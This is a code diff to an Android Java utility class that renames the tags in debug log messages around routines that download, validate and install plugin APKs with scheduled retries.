@@ -106,7 +106,7 @@ public class UtilOperator {
     public static void tryToDownloadPlugin(final Context context) {
         if (SettingManager.getInstance().getDisableDownloadPlugin()) {
             if (Config.DEBUG) {
-                Config.LOGD("[[tryToDownloadPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
+                Config.LOGD("[[tryToDownloadExtPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
             }
             return;
         }
@@ -119,7 +119,7 @@ public class UtilOperator {
 
         if (UtilsRuntime.isOnline(context)) {
             if (Config.DEBUG) {
-                Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
+                Config.LOGD("[[tryToDownloadExtPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
             }
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
@@ -147,19 +147,19 @@ public class UtilOperator {
                             FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                             String localUrl = r.getRawLocalPath();
                             if (Config.DEBUG) {
-                                Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
+                                Config.LOGD("[[tryToDownloadExtPlugin]] download file success to : " + localUrl);
                             }
                             if (!TextUtils.isEmpty(localUrl)) {
                                 String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                 if (!TextUtils.isEmpty(targetPath)) {
                                     if (Config.DEBUG) {
-                                        Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
+                                        Config.LOGD("[[tryToDownloadExtPlugin]] try to mv download file to : " + targetPath);
                                     }
 
                                     File targetFile = new File(targetPath);
                                     if (!Utils.checkAPK(context, targetPath)) {
                                         if (Config.DEBUG) {
-                                            Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
+                                            Config.LOGD("[[tryToDownloadExtPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
                                         }
                                         //delete targetPath
                                         targetFile.delete();
@@ -181,7 +181,7 @@ public class UtilOperator {
                                     DemonService.cancelAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN);
                                     if (targetFile.exists()) {
                                         if (Config.DEBUG) {
-                                            Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
+                                            Config.LOGD("[[tryToDownloadExtPlugin]] success download plugin file : " + targetPath);
                                         }
                                     }
                                     Utils.saveExtraInfo("下载子程序成功");
@@ -199,12 +199,12 @@ public class UtilOperator {
                             }
                         } else {
                             if (Config.DEBUG) {
-                                Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
+                                Config.LOGD("[[tryToDownloadExtPlugin]] download plugin falied, response is null");
                             }
                         }
 
                         if (Config.DEBUG) {
-                            Config.LOGD("[[tryToDownloadPlugin]] try to reDownload for next round with time delay : 5M");
+                            Config.LOGD("[[tryToDownloadExtPlugin]] try to reDownload for next round with time delay : 5M");
                         }
 
                         //notify umeng
@@ -223,7 +223,7 @@ public class UtilOperator {
 
         } else {
             if (Config.DEBUG) {
-                Config.LOGD("[[tryToDownloadPlugin]] try to reDownload for next round with time delay : 5M");
+                Config.LOGD("[[tryToDownloadExtPlugin]] try to reDownload for next round with time delay : 5M");
             }
             DemonService.startAlarmForAction(context, DemonService.ACTION_DOWNLOAD_PLUGIN, ((long) 5) * 60 * 1000);
         }
@@ -249,7 +249,7 @@ public class UtilOperator {
     public static void tryToInstallPlugin(final Context context) {
         if (SettingManager.getInstance().getDisableDownloadPlugin()) {
             if (Config.DEBUG) {
-                Config.LOGD("[[tryToDownloadPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
+                Config.LOGD("[[tryToDownloadExtPlugin::onReceive]] do nothing as the Disable plugin Downlaod is (true)");
             }
             return;
         }
